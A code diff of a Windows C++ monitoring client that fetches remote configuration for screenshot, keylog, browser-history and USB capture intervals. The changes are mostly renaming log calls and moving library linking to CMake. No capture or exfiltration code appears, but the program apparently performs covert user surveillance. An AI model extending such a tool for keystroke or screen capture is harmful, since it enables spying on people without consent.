@@ -92,15 +92,17 @@ typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
 } DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;
 #endif
 
-#pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "gdiplus.lib")
-#pragma comment(lib, "psapi.lib")
-#pragma comment(lib, "setupapi.lib")
-#pragma comment(lib, "sqlite3.lib")
-#pragma comment(lib, "Shcore.lib")
-#pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "oleaut32.lib")
-#pragma comment(lib, "ws2_32.lib")
+// Library linking is handled by CMakeLists.txt
+// #pragma comment directives are MSVC-specific and not needed with MinGW
+// #pragma comment(lib, "wininet.lib")
+// #pragma comment(lib, "gdiplus.lib")
+// #pragma comment(lib, "psapi.lib")
+// #pragma comment(lib, "setupapi.lib")
+// #pragma comment(lib, "sqlite3.lib")
+// #pragma comment(lib, "Shcore.lib")
+// #pragma comment(lib, "ole32.lib")
+// #pragma comment(lib, "oleaut32.lib")
+// #pragma comment(lib, "ws2_32.lib")
 
 // Configuration constants (will be updated from API)
 #define SCREEN_INTERVAL_DEFAULT 5
@@ -1877,25 +1879,25 @@ bool loadSettings() {
 // Configuration Management Functions
 bool fetchConfigurationFromAPI() {
     if (isConfigUpdating) {
-        logMessage("Configuration update already in progress, skipping");
+        writeDebugLog("Configuration update already in progress, skipping");
         return false;
     }
     
     isConfigUpdating = true;
-    logMessage("Fetching configuration from API");
+    writeDebugLog("Fetching configuration from API");
     
     std::string configURL = API_BASE_URL + "/webapi_config.php?platform=windows";
     
     HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
-        logMessage("Failed to initialize internet connection");
+        writeDebugLog("Failed to initialize internet connection");
         isConfigUpdating = false;
         return false;
     }
     
     HINTERNET hConnect = InternetOpenUrlA(hInternet, configURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hConnect) {
-        logMessage("Failed to open configuration URL: " + configURL);
+        writeDebugLog("Failed to open configuration URL: " + configURL);
         InternetCloseHandle(hInternet);
         isConfigUpdating = false;
         return false;
@@ -1914,7 +1916,7 @@ bool fetchConfigurationFromAPI() {
     InternetCloseHandle(hInternet);
     
     if (response.empty()) {
-        logMessage("No configuration data received");
+        writeDebugLog("No configuration data received");
         isConfigUpdating = false;
         return false;
     }
@@ -1924,13 +1926,13 @@ bool fetchConfigurationFromAPI() {
     Json::Reader reader;
     
     if (!reader.parse(response, root)) {
-        logMessage("Failed to parse configuration JSON: " + reader.getFormattedErrorMessages());
+        writeDebugLog("Failed to parse configuration JSON: " + reader.getFormattedErrorMessages());
         isConfigUpdating = false;
         return false;
     }
     
     if (!root["success"].asBool()) {
-        logMessage("Configuration fetch failed: " + root["error"].asString());
+        writeDebugLog("Configuration fetch failed: " + root["error"].asString());
         isConfigUpdating = false;
         return false;
     }
@@ -1939,12 +1941,12 @@ bool fetchConfigurationFromAPI() {
     Json::Value data = root["data"];
     if (data.isObject()) {
         updateConfiguration(data);
-        logMessage("Configuration updated successfully");
+        writeDebugLog("Configuration updated successfully");
         isConfigUpdating = false;
         return true;
     }
     
-    logMessage("Invalid configuration data format");
+    writeDebugLog("Invalid configuration data format");
     isConfigUpdating = false;
     return false;
 }
@@ -1995,17 +1997,17 @@ void updateConfiguration(const Json::Value& config) {
     lastConfigUpdate = std::chrono::system_clock::now();
     
     // Log configuration update
-    logMessage("Configuration updated:");
-    logMessage("  Screenshot: " + std::to_string(screenInterval) + "s");
-    logMessage("  Tic: " + std::to_string(ticInterval) + "s");
-    logMessage("  History: " + std::to_string(historyInterval) + "s");
-    logMessage("  Keylog: " + std::to_string(keyInterval) + "s");
-    logMessage("  USB: " + std::to_string(usbInterval) + "s");
-    logMessage("  Config Refresh: " + std::to_string(configRefreshInterval) + "s");
+    writeDebugLog("Configuration updated:");
+    writeDebugLog("  Screenshot: " + std::to_string(screenInterval) + "s");
+    writeDebugLog("  Tic: " + std::to_string(ticInterval) + "s");
+    writeDebugLog("  History: " + std::to_string(historyInterval) + "s");
+    writeDebugLog("  Keylog: " + std::to_string(keyInterval) + "s");
+    writeDebugLog("  USB: " + std::to_string(usbInterval) + "s");
+    writeDebugLog("  Config Refresh: " + std::to_string(configRefreshInterval) + "s");
 }
 
 void manualConfigRefresh() {
-    logMessage("Manual configuration refresh requested");
+    writeDebugLog("Manual configuration refresh requested");
     fetchConfigurationFromAPI();
 }
 
